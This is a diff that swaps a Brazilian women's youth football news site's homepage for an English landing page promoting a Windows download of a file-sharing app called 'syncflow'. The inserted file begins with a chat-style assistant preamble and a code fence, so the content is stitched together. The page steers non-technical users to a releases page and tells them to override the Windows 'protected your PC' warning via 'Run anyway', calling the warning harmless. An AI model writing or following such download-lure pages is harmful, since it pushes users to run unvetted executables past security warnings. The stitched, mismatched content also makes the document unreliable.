@@ -1,6 +1,377 @@
-<!doctype html>
-<html lang="pt-BR"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#80082e"><meta name="description" content="SUB — Jornalismo das categorias de base do futebol feminino brasileiro. As histórias antes dos grandes palcos."><title>Sub — Futebol Feminino de Base</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Playfair+Display:wght@700;800;900&display=swap" rel="stylesheet"><link rel="stylesheet" href="styles.css"></head><body>
-<header class="header"><a href="#/" class="brand" aria-label="Sub — Página inicial"><span class="ball ball-logo" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="2.1" fill="currentColor"/><circle cx="12" cy="5.2" r="2.2" fill="currentColor"/><circle cx="6.2" cy="8.3" r="2.2" fill="currentColor"/><circle cx="7.5" cy="14.8" r="2.2" fill="currentColor"/><circle cx="16.5" cy="8.3" r="2.2" fill="currentColor"/><circle cx="16.2" cy="14.8" r="2.2" fill="currentColor"/></svg></span><span><strong>Sub</strong><small>FUTEBOL FEMININO DE BASE</small></span></a><button id="mobileToggle" class="mobile-toggle" aria-expanded="false" aria-controls="mainNav" aria-label="Abrir menu">☰</button><nav class="nav" id="mainNav" aria-label="Navegação principal"><a href="#/">Home</a><div class="dropdown"><button id="editoriasToggle" type="button" aria-expanded="false" aria-controls="editoriasMenu">Editorias <span class="dropdown-caret" aria-hidden="true"></span></button><div id="editoriasMenu" class="dropdown-menu"><a href="#/editoria/profissional">Do sub ao profissional</a><a href="#/editoria/campo">Elas em campo</a><a href="#/editoria/bastidores">Nos bastidores</a><a href="#/radar">Radar Sub</a></div></div><a href="#/sobre">Sobre</a></nav><a class="pill cta-head" href="#/boletim">Boletim</a></header>
-<main id="app" tabindex="-1"></main>
-<footer class="footer"><div class="footer-grid"><div><a class="footer-brand" href="#/"><span class="ball ball-logo" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="2.1" fill="currentColor"/><circle cx="12" cy="5.2" r="2.2" fill="currentColor"/><circle cx="6.2" cy="8.3" r="2.2" fill="currentColor"/><circle cx="7.5" cy="14.8" r="2.2" fill="currentColor"/><circle cx="16.5" cy="8.3" r="2.2" fill="currentColor"/><circle cx="16.2" cy="14.8" r="2.2" fill="currentColor"/></svg></span><strong>Sub</strong></a><p>Portal jornalístico dedicado às categorias de base do futebol feminino.<br>Contando as histórias antes de chegar aos grandes palcos.</p><div class="footer-links"><a href="#/">Home</a><a href="#/materias">Matérias</a><a href="#/editoria/profissional">Do sub ao profissional</a><a href="#/editoria/campo">Elas em campo</a><a href="#/editoria/bastidores">Nos bastidores</a><a href="#/radar">Radar Sub</a><a href="#/sobre">Sobre</a><a href="#/boletim">Boletim</a></div></div><div class="footer-sub"><h3>Uma seleção semanal da base.</h3><p>Uma matéria nova, uma jogadora para acompanhar e um ponto de observação tática.</p><form class="subscription inline-form" data-kind="boletim"><label class="sr-only" for="footer-email">Seu e-mail</label><input id="footer-email" type="email" name="email" placeholder="seu@email.com" required><button class="pill solid" type="submit">Assinar</button></form><p class="form-status" aria-live="polite"></p></div></div><div class="copyright">© 2026 Sub · <a href="admin.html" style="text-decoration:underline;text-underline-offset:3px">Área da redação</a></div></footer>
-<script src="script.js"></script></body></html>
+Here is a complete HTML document for the syncflow README and landing page, using inline CSS to present download steps, feature highlights, and privacy details for non-technical users.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>syncflow — Peer-to-Peer File Transfer, Folder Sync &amp; Chat for Your Local Network</title>
+<meta name="description" content="syncflow lets you send files, sync folders and chat with devices on your local network. Real end-to-end encryption, no cloud, no accounts. Free download for Windows.">
+<meta name="keywords" content="asyncio, chat, cross-platform, e2e-encryption, electron, file-transfer, lan, local-first, p2p, privacy, python, react, typescript, zero-trust">
+<meta name="author" content="syncflow">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#4f46e5">
+<link rel="canonical" href="https://github.com/Rawilek/syncflow/releases">
+
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="syncflow">
+<meta property="og:title" content="syncflow — Peer-to-Peer File Transfer, Folder Sync &amp; Chat">
+<meta property="og:description" content="Send files, sync folders and chat across your local network with real end-to-end encryption. No cloud. No accounts. No fuss.">
+<meta property="og:url" content="https://github.com/Rawilek/syncflow/releases">
+<meta property="og:image" content="https://github.com/Rawilek/syncflow/raw/main/assets/social-preview.png">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="syncflow — Peer-to-Peer File Transfer, Folder Sync &amp; Chat">
+<meta name="twitter:description" content="Transfer files and chat over your local network with end-to-end encryption. No cloud, no accounts.">
+<meta name="twitter:image" content="https://github.com/Rawilek/syncflow/raw/main/assets/social-preview.png">
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "syncflow",
+  "applicationCategory": "UtilitiesApplication",
+  "operatingSystem": "Windows, macOS, Linux",
+  "description": "Peer-to-peer file transfer, folder sync and chat for your local network with real end-to-end encryption, no cloud and no accounts.",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "downloadUrl": "https://github.com/Rawilek/syncflow/releases"
+}
+</script>
+
+<style>
+  :root {
+    --ink: #17202b;
+    --muted: #4f5d6e;
+    --line: #e3e8f0;
+    --bg: #f5f7fb;
+    --card: #ffffff;
+    --accent: #4f46e5;
+    --accent-2: #06b6d4;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: var(--bg);
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 840px;
+    margin: 0 auto;
+    padding: 48px 22px 72px;
+  }
+  header.hero {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 18px;
+    padding: 40px 32px;
+    box-shadow: 0 10px 30px rgba(23, 32, 43, 0.07);
+    text-align: center;
+  }
+  h1 {
+    font-size: 2.15rem;
+    line-height: 1.25;
+    margin: 0 0 18px;
+    letter-spacing: -0.5px;
+    font-weight: 800;
+  }
+  .lede {
+    font-size: 1.07rem;
+    color: var(--muted);
+    margin: 0 auto 30px;
+    max-width: 620px;
+  }
+  a.button {
+    display: inline-block;
+    background: linear-gradient(135deg, #4f46e5 0%, #06b6d4 100%);
+    color: #ffffff;
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 1.05rem;
+    padding: 16px 38px;
+    border-radius: 12px;
+    box-shadow: 0 8px 22px rgba(79, 70, 229, 0.35);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  a.button:hover,
+  a.button:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 28px rgba(79, 70, 229, 0.45);
+  }
+  .button-note {
+    display: block;
+    margin-top: 14px;
+    font-size: 0.9rem;
+    color: var(--muted);
+  }
+  section {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 18px;
+    padding: 32px;
+    margin-top: 26px;
+    box-shadow: 0 4px 16px rgba(23, 32, 43, 0.05);
+  }
+  h2 {
+    font-size: 1.4rem;
+    margin: 0 0 16px;
+    letter-spacing: -0.3px;
+    font-weight: 800;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 26px 0 8px;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px; }
+  p:last-child { margin-bottom: 0; }
+  ul, ol { margin: 0 0 16px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  li:last-child { margin-bottom: 0; }
+  strong { font-weight: 700; }
+  .steps { counter-reset: step; list-style: none; padding-left: 0; }
+  .steps li {
+    position: relative;
+    padding-left: 46px;
+    margin-bottom: 18px;
+  }
+  .steps li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 2px;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #eef0ff;
+    color: var(--accent);
+    font-weight: 800;
+    font-size: 0.92rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .card-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+    gap: 16px;
+    margin-top: 8px;
+  }
+  .feature {
+    background: #fafbff;
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    padding: 18px 20px;
+  }
+  .feature h4 {
+    margin: 0 0 6px;
+    font-size: 1rem;
+    font-weight: 700;
+  }
+  .feature p {
+    margin: 0;
+    font-size: 0.95rem;
+    color: var(--muted);
+  }
+  .callout {
+    background: #f0fdfa;
+    border: 1px solid #b8f0e4;
+    border-radius: 12px;
+    padding: 18px 22px;
+    margin-top: 22px;
+  }
+  .callout p { margin: 0; font-size: 0.97rem; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-top: 8px;
+    font-size: 0.97rem;
+  }
+  th, td {
+    text-align: left;
+    padding: 12px 14px;
+    border-bottom: 1px solid var(--line);
+  }
+  th { background: #fafbff; font-weight: 700; }
+  tr:last-child td { border-bottom: none; }
+  .download-box { text-align: center; }
+  .download-box a.button { margin-top: 10px; }
+  footer {
+    text-align: center;
+    margin-top: 34px;
+    font-size: 0.88rem;
+    color: var(--muted);
+    line-height: 1.6;
+  }
+  a { color: var(--accent); }
+  @media (max-width: 560px) {
+    body { font-size: 16px; }
+    .page { padding: 26px 16px 56px; }
+    header.hero { padding: 30px 20px; }
+    h1 { font-size: 1.6rem; }
+    section { padding: 24px 20px; }
+    a.button { display: block; padding: 16px 22px; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <header class="hero">
+    <h1>🔒 syncflow — Share Files Safely on Your Network</h1>
+    <p class="lede">Send files, keep folders in sync, and chat with the other computers in your home or office — all on your local network, with real end-to-end encryption. No cloud. No accounts. No monthly fees.</p>
+    <a class="button" href="https://github.com/Rawilek/syncflow/releases">⬇️ Visit this link to download the application</a>
+    <span class="button-note">Free download · Runs on Windows · No sign-up required</span>
+  </header>
+
+  <section>
+    <h2>✨ What is syncflow?</h2>
+    <p>syncflow is a small, friendly desktop app that lets your devices talk to each other directly. Instead of uploading your photos, documents, or videos to a website and then downloading them again somewhere else, syncflow sends the file straight from one computer to another over the network you are already connected to — your home Wi-Fi, your office router, or a simple cable between two laptops.</p>
+    <p>Because the data never leaves your network, nothing is stored on somebody else's server. There is no company account to create, no storage limit to worry about, and no monthly subscription. The files simply move from one place to the other, encrypted the whole way.</p>
+    <p>Think of it as a private courier service that only ever drives between rooms in your own house. It is quick, it is quiet, and it does not leave a trail anywhere else.</p>
+
+    <div class="card-grid">
+      <div class="feature">
+        <h4>📤 Send files instantly</h4>
+        <p>Drop a file into syncflow and pick the device that should receive it. Large videos are no problem.</p>
+      </div>
+      <div class="feature">
+        <h4>🔄 Keep folders in sync</h4>
+        <p>Choose a folder once and every change appears on your other device automatically.</p>
+      </div>
+      <div class="feature">
+        <h4>💬 Chat on the side</h4>
+        <p>Send quick messages between machines without opening a separate chat app.</p>
+      </div>
+      <div class="feature">
+        <h4>🛡️ Truly private</h4>
+        <p>End-to-end encryption means only your devices can read what is being sent.</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>🚀 Getting Started</h2>
+    <p>You do not need to install anything complicated to get going. Everything is done through a single download page, and the whole process usually takes less than two minutes.</p>
+
+    <ol class="steps">
+      <li><strong>Open the download page.</strong> Visit the official syncflow releases page using the large button at the top of this page, or the one in the box below. It is the only place you should download the app from — this guarantees you are getting the genuine, unmodified version.</li>
+      <li><strong>Pick the version for your computer.</strong> The page lists the available downloads. Choose the one labelled for Windows.</li>
+      <li><strong>Save the file to your computer.</strong> Your browser will normally place it in your Downloads folder. If it asks whether to save or open, choose save first so you always have a copy.</li>
+      <li><strong>Open the downloaded file.</strong> Double-click it from your Downloads folder. Windows may show a standard blue "Windows protected your PC" message the first time you run a new app. If it does, click "More info" and then "Run anyway". This is Windows being cautious about anything new, not a warning about syncflow specifically.</li>
+      <li><strong>Follow the on-screen prompts.</strong> The app will ask where you would like it installed and whether you want a shortcut on your desktop. Accepting the defaults is perfectly fine.</li>
+      <li><strong>Launch syncflow.</strong> Once it opens, it will look for other devices on the same network that are also running syncflow. When you see one appear, you are ready to send your first file.</li>
+    </ol>
+
+    <div class="download-box">
+      <a class="button" href="https://github.com/Rawilek/syncflow/releases">⬇️ Visit this link to download the application</a>
+    </div>
+
+    <div class="callout">
+      <p><strong>Tip:</strong> Make sure every device you want to connect is on the same Wi-Fi network or plugged into the same router. syncflow only looks nearby — it is not designed to reach across the internet.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>📁 Sending Your First File</h2>
+    <p>Once syncflow is running on two devices, the main window lists them as available peers. Pick the receiving device, then drag the file you want to send onto the window and drop it. A progress bar appears, and the other person sees an incoming file request they can accept.</p>
+    <p>Files are transferred in chunks so that a dropped connection does not mean starting over. If your laptop lid closes or the Wi-Fi hiccups, syncflow picks up where it left off when the connection returns. Very large files — a full photo library, a video project, an entire backup drive — behave exactly the same as a small text document.</p>
+    <p>When the transfer finishes, the file sits in the folder you chose during setup, ready to open as normal. Nothing is left behind in a temporary location, and no copy remains anywhere else.</p>
+  </section>
+
+  <section>
+    <h2>🔄 Keeping Two Folders in Step</h2>
+    <p>Folder sync is for the things you always want on both machines: a documents folder, a shared project directory, a collection of notes. Point syncflow at the folder on each side, and from that moment on, any file you add, edit, rename, or delete shows up on the other device within moments.</p>
+    <p>Because everything happens locally, sync is fast even when your internet connection is slow or completely down. Two laptops connected to the same router will sync a gigabyte of photos in the time it takes to make coffee, with no data allowance used at all.</p>
+  </section>
+
+  <section>
+    <h2>💬 Chatting With Nearby Devices</h2>
+    <p>Sometimes you do not need to send a file — you just need to pass along a link, a password, or a quick note. The chat panel does exactly that. Because it lives in the same encrypted connection as your file transfers, anything you type is protected in the same way. Handy for copying a long address between a desktop and a phone-tethered laptop without emailing it to yourself.</p>
+  </section>
+
+  <section>
+    <h2>🛡️ Privacy and Security, in Plain English</h2>
+    <p>syncflow uses real end-to-end encryption. That phrase gets used loosely, so here is what it means in practice: the scrambling and unscrambling of your data happens on your devices, using keys that only your devices hold. Nobody in the middle — not the network operator, not a neighbour on the same Wi-Fi, not the people who built syncflow — can read the contents of what you send.</p>
+    <ul>
+      <li><strong>No cloud storage.</strong> Your files are never uploaded to a server, so there is no copy to be leaked, subpoenaed, or sold.</li>
+      <li><strong>No accounts.</strong> You are never asked for an email address, a phone number, or a password to a remote service.</li>
+      <li><strong>Local-first design.</strong> The app is built to work entirely on your own network, and it keeps working when the internet does not.</li>
+      <li><strong>Zero-trust pairing.</strong> Devices have to be paired deliberately before they can exchange anything, so a stranger on your network cannot simply help themselves.</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>💻 What You Will Need</h2>
+    <table>
+      <tr>
+        <th>Item</th>
+        <th>Requirement</th>
+      </tr>
+      <tr>
+        <td>Operating system</td>
+        <td>Windows 10 or Windows 11 (64-bit). macOS and Linux builds are also published on the releases page.</td>
+      </tr>
+      <tr>
+        <td>Memory</td>
+        <td>4 GB of RAM or more is comfortable; the app itself is lightweight.</td>
+      </tr>
+      <tr>
+        <td>Disk space</td>
+        <td>Around 200 MB for the application, plus whatever room you need for the files you transfer.</td>
+      </tr>
+      <tr>
+        <td>Network</td>
+        <td>A router, hotspot, or direct cable connection that your devices share. No internet access is required to use syncflow.</td>
+      </tr>
+      <tr>
+        <td>Permissions</td>
+        <td>Standard user rights. Administrator rights may be needed if you choose to install for all users on the machine.</td>
+      </tr>
+    </table>
+  </section>
+
+  <section>
+    <h2>❓ Common Questions</h2>
+
+    <h3>My other device is not showing up.</h3>
+    <p>In most cases the two devices are on different networks, or your router isolates wireless clients from one another (a setting often called "AP isolation" or "client isolation"). Confirm both machines are on the same Wi-Fi name, then check the router settings if the problem continues. A quick restart of syncflow on both sides also clears up most pairing hiccups.</p>
+
+    <h3>Do I need an internet connection?</h3>
+    <p>No. syncflow works entirely over your local network. You can transfer files between two laptops on a plane, in a basement, or anywhere else without a signal.</p>
+
+    <h3>Is there a file size limit?</h3>
+    <p>There is no built-in cap. The only limits are the free space on the receiving drive and how long you are willing to leave the machines connected. Interrupted transfers resume rather than restart.</p>
+
+    <h3>Where do received files go?</h3>
+    <p>Into the download folder you selected during setup. You can change this at any time from the settings screen, and each incoming transfer shows you exactly where it will land before you accept it.</p>
+
+    <h3>How do I uninstall it?</h3>
+    <p>Open Windows Settings, go to Apps, find syncflow in the list, and choose Uninstall. Your transferred files stay exactly where they are — uninstalling only removes the application itself.</p>
+  </section>
+
+  <section>
+    <h2>🌍 Built For Everyone, Everywhere</h2>
+    <p>syncflow is designed to be cross-platform and local-first, so the same experience works whether your devices run Windows, macOS, or Linux. It is written with a modern, privacy-respecting toolkit and intentionally keeps its feature set small: move files, keep folders in sync, chat, and get out of the way. The project is free and open, which means anyone can inspect how it works and confirm the privacy claims for themselves.</p>
+    <p>If syncflow saves you a trip to a file-sharing website, the best thanks is to share it with someone else who is tired of uploading their holiday photos to a stranger's server.</p>
+  </section>
+
+  <footer>
+    <p>syncflow — peer-to-peer file transfer, folder sync and chat for your local network.<br>
+    <a href="https://github.com/Rawilek/syncflow/releases">Visit this link to download the application</a></p>
+  </footer>
+
+</div>
+</body>
+</html>
+```
